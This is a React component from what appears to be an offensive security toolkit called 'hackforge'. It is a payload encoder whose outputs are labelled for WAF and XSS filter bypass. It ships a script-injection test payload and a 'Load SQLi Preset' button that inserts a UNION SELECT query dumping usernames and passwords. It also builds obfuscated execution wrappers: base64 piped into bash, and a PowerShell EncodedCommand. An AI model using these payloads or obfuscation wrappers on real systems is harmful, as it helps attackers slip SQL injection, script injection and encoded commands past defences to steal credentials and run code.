import React, { useState } from 'react';
import { Binary, Copy, Check, Sparkles, RefreshCw } from 'lucide-react';

export const PayloadEncoderTool: React.FC = () => {
  const [inputText, setInputText] = useState("<script>alert('hackforge')</script>");
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  const handleCopy = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2000);
  };

  // Encodings
  const urlEncoded = encodeURIComponent(inputText);
  const doubleUrlEncoded = encodeURIComponent(urlEncoded);
  const base64Encoded = btoa(unescape(encodeURIComponent(inputText)));
  
  let base64Decoded = '';
  try {
    base64Decoded = decodeURIComponent(escape(atob(inputText)));
  } catch {
    base64Decoded = '(Invalid Base64 input)';
  }

  const hexEncoded = Array.from(inputText)
    .map((c) => c.charCodeAt(0).toString(16).padStart(2, '0'))
    .join('');

  const htmlEntities = Array.from(inputText)
    .map((c) => `&#${c.charCodeAt(0)};`)
    .join('');

  const bashB64Execution = `echo -n "${base64Encoded}" | base64 -d | bash`;
  const powershellB64 = `powershell -enc ${btoa(
    inputText
      .split('')
      .map((c) => c + '\0')
      .join('')
  )}`;

  const items = [
    { key: 'url', label: 'URL Encoded (Web Query / Form)', value: urlEncoded },
    { key: 'double_url', label: 'Double URL Encoded (WAF Bypass)', value: doubleUrlEncoded },
    { key: 'b64', label: 'Base64 Encoded', value: base64Encoded },
    { key: 'b64_dec', label: 'Base64 Decoded', value: base64Decoded },
    { key: 'hex', label: 'Hex String (0x...)', value: '0x' + hexEncoded },
    { key: 'html', label: 'HTML Decimal Entities (XSS Bypass)', value: htmlEntities },
    { key: 'bash_wrapper', label: 'Linux Bash Execution Wrapper', value: bashB64Execution },
    { key: 'ps_enc', label: 'Windows PowerShell EncodedCommand', value: powershellB64 },
  ];

  return (
    <div className="p-6 rounded-2xl bg-neutral-950 border border-neutral-800 space-y-6">
      <div className="flex flex-wrap items-center justify-between gap-3 border-b border-neutral-800 pb-4">
        <div>
          <div className="flex items-center gap-2">
            <Binary className="w-4 h-4 text-emerald-400" />
            <span className="text-xs font-mono font-bold text-emerald-400 uppercase tracking-wider">
              Payload & Shell Encoder / Decoder
            </span>
          </div>
          <h2 className="text-base font-bold text-neutral-100">
            WAF Bypass & Filter Obfuscation
          </h2>
        </div>
        <button
          onClick={() => setInputText("union select 1,group_concat(username,0x3a,password),3 from users-- -")}
          className="text-xs font-mono px-3 py-1.5 rounded-lg bg-neutral-900 hover:bg-neutral-800 border border-neutral-800 text-neutral-300 transition-colors"
        >
          Load SQLi Preset
        </button>
      </div>

      <div className="space-y-1.5">
        <label className="text-xs font-mono text-neutral-400">Raw Input Payload / String:</label>
        <textarea
          rows={2}
          value={inputText}
          onChange={(e) => setInputText(e.target.value)}
          className="w-full px-3 py-2 bg-neutral-900 border border-neutral-800 rounded-xl text-neutral-100 font-mono text-xs focus:outline-none focus:border-emerald-500 transition-colors"
          placeholder="Type or paste payload here..."
        />
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
        {items.map((item) => (
          <div
            key={item.key}
            className="p-3.5 rounded-xl bg-neutral-900 border border-neutral-800 flex flex-col justify-between gap-2"
          >
            <div className="flex items-center justify-between">
              <span className="text-[11px] font-mono text-neutral-400 font-medium">
                {item.label}
              </span>
              <button
                onClick={() => handleCopy(item.value, item.key)}
                className="text-[11px] font-mono px-2 py-0.5 rounded bg-neutral-800 hover:bg-neutral-700 text-neutral-300 flex items-center gap-1 transition-colors"
              >
                {copiedKey === item.key ? (
                  <Check className="w-3 h-3 text-emerald-400" />
                ) : (
                  <Copy className="w-3 h-3" />
                )}
                <span>{copiedKey === item.key ? 'Copied' : 'Copy'}</span>
              </button>
            </div>
            <div className="p-2 rounded-lg bg-black font-mono text-xs text-emerald-300 truncate select-all">
              {item.value}
            </div>
          </div>
        ))}
      </div>
    </div>
  );
};
